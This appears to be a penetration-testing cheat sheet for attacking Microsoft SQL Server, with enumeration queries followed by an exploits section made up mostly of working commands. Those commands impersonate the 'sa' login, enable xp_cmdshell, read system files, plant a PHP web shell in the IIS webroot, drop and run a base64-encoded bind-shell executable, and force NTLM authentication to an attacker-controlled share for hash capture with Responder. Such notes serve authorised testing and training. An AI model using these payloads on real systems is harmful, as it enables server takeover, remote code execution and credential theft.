+++
title = "🪟 MSSQL: TCP/UDP 1433"
+++

- `TCP/UDP 1433`: normal
- `TCP 2433`: hidden mode
- default system schemas/databases:
    - `master`, `msdb`, `model`, `resource`, `tempdb`

Microsoft's closed-source version of SQL.

- https://www.microsoft.com/en-us/sql-server/sql-server-2019
- https://learn.microsoft.com/en-us/ssms/install/install?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15

{{% details "Dangerous Settings" %}}

- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account

{{% /details %}}

```bash
# Domain account
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET>

# SQL auth (local account, no domain)
impacket-mssqlclient <USER>:'<PASSWORD>'@<TARGET>
```

## Survey

- https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#common-enumeration

```sql
SELECT @@version;
SELECT user_name();
SELECT system_user;
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1+ is admin

-- Databases
SELECT name FROM master.dbo.sysdatabases;
-- Tables
SELECT TABLE_NAME FROM <DATABASE>.INFORMATION_SCHEMA.TABLES;
-- Columns
SELECT COLUMN_NAME FROM <DATABASE>.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<TABLE>';
-- Values
SELECT * FROM <DATABASE>.dbo.<TABLE>;
```

```sql
-- Linked servers (pivot potential)
SELECT name FROM master.dbo.sysservers;

-- Current privileges
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- xp_cmdshell status check
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Active sessions
SELECT login_name, host_name, program_name FROM sys.dm_exec_sessions WHERE is_user_process = 1;
```

## Exploits

[`netexec` includes some of these functions in a easier fashion]({{% ref "netexec.md" %}})

### Impersonate User

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
GO

-- Impersonating the SA User (admin)
USE master
EXECUTE AS LOGIN = 'sa'
-- Verify
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- 0 is NOT admin
```

### `xp_cmdshell` (command execution)

- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15

A powerful feature that is **disabled by default**. The process spawned by `xp_cmdshell` has the same security rights as the `SQL Server` service account

Requires sysadmin role (or `CONTROL SERVER` + `EXECUTE` on `xp_cmdshell`). Verify with `SELECT IS_SRVROLEMEMBER('sysadmin');`

```sql
-- Shortcut in some clients
enable_xp_cmdshell
-- Same above; used with raw DB access
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute commands on the machine
xp_cmdshell <COMMAND>

-- or run linked server command
EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]
```

### Read Files

Requires `ADMINISTER BULK OPERATIONS` or sysadmin

```sql
-- Check permission
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name = 'ADMINISTER BULK OPERATIONS';

-- Read file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

### Write Files (command execution)

Requires sysadmin for `sp_configure` and `Ole Automation Procedures`. The SQL Server service account also needs write access to the target path (`c:\inetpub\wwwroot\` usually writable on default IIS+MSSQL boxes).

#### Webshell

```sql
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["cmd"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

#### Binary Payload

This will write a binary executable to base64 on the target, decode, and execute it.

Requires sysadmin (`xp_cmdshell` + `Ole Automation`). Service account needs write to `C:\Users\Public\`.

##### Encode payload

```bash
# Generate payload, base64 encode, strip newlines, copy to clipboard
base64 -w0 bind_shell_x64.exe | xclip
```

##### Write Payload

**Replace `<BASE64>`**

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT; DECLARE @FileID INT; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\Users\Public\output.b64', 8, 1; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<BASE64>'; EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
```

##### Execute

```sql
exec xp_cmdshell 'dir C:\Users\Public'
exec xp_cmdshell 'certutil -decode C:\Users\Public\output.b64 C:\Users\Public\output.exe'
exec xp_cmdshell 'C:\Users\Public\output.exe'
```

### Linked Servers

`xp_dirtree`, `xp_subdirs`, and `xp_fileexist` can be executed by the `public` role -- **no `sysadmin` required**. 

```sql
SELECT name, is_linked FROM sys.servers;
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>\SQLEXPRESS]

-- Capture NTLM Hash
sudo responder -I <INTERFACE>

-- XP_DIRTREE Hash Stealing
EXEC master..xp_dirtree '\\<ATTACKER>\share'
-- XP_SUBDIRS Hash Stealing
EXEC master..xp_subdirs '\\<ATTACKER>\share'
-- XP_FILEEXIST Hash Stealing
EXEC master..xp_fileexist '\\<ATTACKER>\share'
```
